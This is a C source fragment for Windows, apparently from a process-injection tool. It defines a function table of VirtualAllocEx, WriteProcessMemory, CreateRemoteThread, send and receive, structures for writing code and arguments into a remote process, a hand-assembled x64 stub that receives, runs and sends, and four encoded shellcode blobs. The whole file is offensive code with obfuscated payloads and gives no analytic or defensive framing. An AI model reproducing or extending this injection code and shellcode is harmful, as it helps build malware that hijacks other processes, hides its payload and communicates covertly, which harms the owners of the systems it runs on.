
char *offset_GOT = "\x01\x01\x01\x01\x01\x01\x01\x01\x02\x02\x02\x02\x02\x02\x02\x02\x03\x03\x03\x03\x03\x03\x03\x03\x04\x04\x04\x04\x04\x04\x04\x04\x05\x05\x05\x05\x05\x05\x05\x05\x06\x06\x06\x06\x06\x06\x06\x06\x07\x07\x07\x07\x07\x07\x07\x07\x08\x08\x08\x08\x08\x08\x08\x08\x09\x09\x09\x09\x09\x09\x09\x09\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0d\x0d\x0d\x0d\x0d\x0d\x0d\x0d\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x10\x10\x10\x10\x10\x10\x10\x10\x11\x11\x11\x11\x11\x11\x11\x11";


typedef struct s_MyCuteGoT
{
    LPVOID FgetLowerbits;
    LPVOID FgetHigherbits;
    LPVOID Fxor;
    LPVOID Fswap;
    LPVOID Fmalloc;
    LPVOID Fstrlen;
    LPVOID FCurrentPId;
    LPVOID FVirtualAllocEx;
    LPVOID FWriteProcessMemory;
    LPVOID FCreateRemoteThread;
    LPVOID FHandleProcess;
    LPVOID Fsprintf;
    LPVOID FgetPOS;
    LPVOID Fsend;
    LPVOID Reciveve;
    LPVOID Binoffset;
} MyCuteGoT;

typedef struct s_InternalInfo
{
        int Pid;
        int Cid;
        HANDLE hProcess;
        LPVOID RemoteDllSegment;
        SIZE_T LenghtRemoteDllSegment;
        LPVOID RemoteArgsSegment;
        SIZE_T LenghtRemoteArgsSegment;
        LPVOID RemoteCodeSegment;
        SIZE_T LenghtRemoteCodeSegment;
        LPVOID EntryFuncName;
        SIZE_T BytesWrited;
        LPVOID EntryFuncPointer;
        LPVOID InternalData;
        LPVOID Key;
        LPVOID C1;
        LPVOID C2;
        LPVOID P1;
        LPVOID P2;
        char* S;
}InternalInfo;

typedef struct s_Data
{
    char RemoteArgsSegment[0x100];
    char EntryFuncName[0x50];
    char Key[0x50];
    char C1[0x50];
    char C2[0x50];
    char P1[0x50];
    char P2[0x50];
}InternalData;

InternalData *Parent_Data;   
InternalInfo *Parent_Iinfo;
MyCuteGoT *Child_Got;
PROCESS_INFORMATION pi = {};
STARTUPINFO si = {};
char *InjectCode;
TCHAR TempFile[MAX_PATH];
size_t SizeInjectCode;
typedef LPVOID (func_II_void)(InternalInfo *);
typedef int (*func_II_int)(InternalInfo *);

char *RunCode =  "\x48\x83\xEC\x50"//sub rsp 0x20
                 "\x48\xB9\x01\x02\x03\x04\x05\x06\x07\x08"// mov rcx, $Iinfo
                 "\x48\xB8\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f"//mov rax, $Recieve
                 "\xFF\xD0"//call rax
                 "\x48\xB9\x01\x02\x03\x04\x05\x06\x07\x08"// mov rcx, $Iinfo
                 "\x48\xB8\xc0\xc0\xc0\xc0\xc0\xc0\xc0\xc0"//mov rax, $mainfunc
                 "\xFF\xD0"//call rax
                 "\x48\xB8\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e"//mov rax, $Send
                 "\xFF\xD0\x48\x83\xC4\x50\xC3";//call rax;add rsp,0x20; ret
size_t SizeRunCode = 66;

char *shellcode1 = "\x96\x14\xc1\xd1\xdd\xa9\xc5\xd5\xd9\xa5\x95\x9b\x57\x48\x88\x50\x32\xdd\x88\x5a\x93\xbd\x88\x6b\xd3\xa0\xcd\xde\xd3\xa0\xcd\xde\x96\x24\x85\x3b\x96\x15\xc2\xd1\xdc\xaf\xc2\xd1\xdc\xaf\x88\x5a\x9b\x4d\x88\x6b\xdf\xac\xc1\xd2\xdf\xac\xc1\xd2\x96\x24\x85\x0b\x96\x26\x85\x3b\x21\x7d\x88\x5a\x9b\x7d\x88\x58\x9b\xbd\x88\x58\x9e\xd5\x88\x5a\x9b\x65\x88\x58\x9b\xbd\x88\x58\x5e\x2d\xc0\xd3\xde\xe5\x49\x96\x1e\xe5\x4b\x96\xce\xe5\x4b\x93\xbe\xe5\x49\x96\x66\x6a\x85\x27\xd5\xad\xc0\xd3\x5d\xd0\x34\xdf\xa9\x57\x4b\x96\x2a\xe5\x4d\xc7\x5b\xad\xc0\xd3\xde\xe5\x78\x09\x04\x77\x1a\x09\x04\x77\x1a\x58\xda\xaf\x88\xb0\x0e\xe5\x78\x09\x04\x77\x1a\x09\x04\x77\x1a\x9b\xdf\x7d\x3f\x33\x55\xe8\x38\x9b\xbd";
size_t lenshellcode1 = 0xad;

char *shellcode2 = "\x96\x14\x1a\x09\x04\x77\x1a\x09\x04\x77\x88\x69\x61\x12\x7f\x6c\x61\x12\x7f\x6c\x8b\xe5\x49\x36\x96\x2e\x2c\x83\x57\xe0\xd0\x9b\x57\xf8\xd8\x9b\x66\xa9\xc4\xd7\xda\xa9\xc4\xd7\xda\xe5\x49\x96\x2e\xe5\x78\xd5\xd8\xab\xc6\xd5\xd8\xab\xc6\x9b\x57\xe8\x28\x9b\x66\xa1\xcc\xdf\xd2\xa1\xcc\xdf\xd2\xe5\x49\x96\x3e\xe5\x4b\x96\x3e\x26\x8d\xc3\x21\x7d\x88\x5a\x9b\x75\x88\x58\x8b\x75\x88\x58\x9b\x45\x88\x5a\x0f\x52\x10\x5a\x9b\x79\x07\x96\x22\xad\xc0\xd3\xde\x6a\x85\x2b\xde\xad\xc0\xd3\x35\xbb\x4b\x96\x26\xe5\xa3\x03\x96\x26\x85\xcb\x96\xac\x10\x58\x8b\x55\x48\xc3\x5d\xe8\x38\xd2\x5f\xd0\x38\x2c\xde\xad\xc0\xad\x3f\x6a\x85\x2b\xde\xad\xc0\xd3\x35\xc0\x4b\x96\x26\xe5\xa3\x03\x96\x26\x85\xcb\x96\xac\x10\xdc\x68\xad\xcf\x65\x0e\x26\x85\x2f\x53\xa1\xc2\x58\x9b\x55\x59\x24\xa3\x79\x49\x03\x96\xce\x10\x9b\x55\xe8\x18\x9b\xdf\x7d\xcf\x65\xde\xa2\x7e\x13\x53\xb9\xc1\x5a\x0e\x6c\x38\xcc\x1f\x45\xd8\xd2\x1c\xa2\x76\x01\xf7\x6f\x49\x03\x57\xe8\x3c\x58\x9b\x51\x88\xb0\x0e\xe5\x4b\x96\xc6\xe5\xc1\x11\x55\xe8\x38\x9b\xbd\x65\x88\x58\x9b\xb5\x88\xd2\x1f\xe5\x4b\x96\x2e\x52\x10\x50\x9b\x55\xc1\x52\xa3\x55\x3f\xd3\xde\xad\xbe\x59\x66\xad\xc0\xd3\xde\xe5\x43\x17\x8e\xf0\x03";
size_t lenshellcode2= 0x123;

char *shellcode3 = "\x96\x14\x1a\x09\x04\x77\x1a\x09\x04\x77\x88\x69\x05\x76\x1b\x08\x05\x76\x1b\x08\x97\x15\x1c\x0f\x02\x71\x1c\x0f\x02\x71\x95\x9b\x57\x48\x88\x50\x32\xed\x88\x5a\x93\xbd\x88\x5a\x8b\xb5\x8c\x5a\x9b\x8d\x07\x96\x22\xad\xc0\xd3\xde\x6a\x85\x2b\xde\xad\xc0\xd3\x96\x15\xc4\xd7\xda\xa9\xc4\xd7\xda\xa9\x88\x5a\x9b\x45\x07\x96\x3a\x89\xc0\xd3\xde\xe5\x07\x96\x2e\xad\xc0\xd3\xde\x44\x08\xd3\xde\xad\x4b\x96\x22\x20\x90\xd2\x57\x7d\x01\x2b\xc1\x6c\x28\xcb\xdf\x6f\xcf\x65\x0c\x84\x02\x5a\x0e\x24\x85\x2f\x55\xe8\x3c\x9b\xbd\x7d\x88\x58\x9b\xbd\x88\xd2\x0e\xa2\x76\xd3\xd1\x1b\x10\x58\x9b\x55\xc1\x11\x57\x7d\x01\x2b\xc1\x6c\x28\xcb\xdf\x6f\xcf\x65\x0c\x84\x02\x5a\x0e\x24\x85\x2b\x55\xe8\x38\x9b\xbd\x7d\x88\x58\x9b\xbd\x88\xd2\x1c\x26\x85\x2f\x96\xce\x08\x9b\x55\xe8\xd0\x9b\xdf\x6c\x88\x58\x9b\x45\x3f\x03\x55\xe8\x3c\x9b\xbd\x7d\x88\x58\x9b\xbd\x88\xd2\x0e\xa2\x76\xd3\xd1\x1b\x10\x58\x9b\x55\x88\xb0\x16\xe5\x4b\x96\xce\xe5\xc1\x1b\xd1\x1b\xc0\xdc\x68\x6d\xc1\x03\x96\x35\xcf\x65\x0e\xe5\x4b\x96\xce\xe5\xc1\x03\xd1\x1b\xc0\xdc\x68\x6d\x49\x96\x3e\xe5\x4b\x86\xfe\xe5\x4b\x96\x2e\xe5\xc1\x03\x96\x26\x8d\xcb\x96\x26\x95\x23\x96\xac\x0a\xdc\x68\xbf\x4b\x9e\x3e\x9c\x0a\x5b\xce\xe5\x43\x96\x2e\xac\x4b\x96\x3a\xe5\x58\x9b\xe5\xe8\x30\xdc\x59\x84\x3f\x2c\x21\x15\xc0\xd3\xde\xad\x88\x50\x1a\xed\x9d\x10";
size_t lenshellcode3 = 0x144;

char *shellcode4 = "\x96\x14\x1a\x09\x04\x77\x1a\x09\x04\x77\x03\x86\x96\x24\x25\x9b\x5d\x41\xf0\x9b\x57\xe0\xd0\x9b\x66\xaa\xc7\xd4\xd9\xaa\xc7\xd4\xd9\xe5\x49\x96\x26\xe5\x4b\x96\x26\x52\x10\x5a\x1c\xe5\x4b\x96\xce\x24\x90\xd7\x96\x2e\x04\xe3\x83\x6e";
size_t lenshellcode4 = 0x3a;

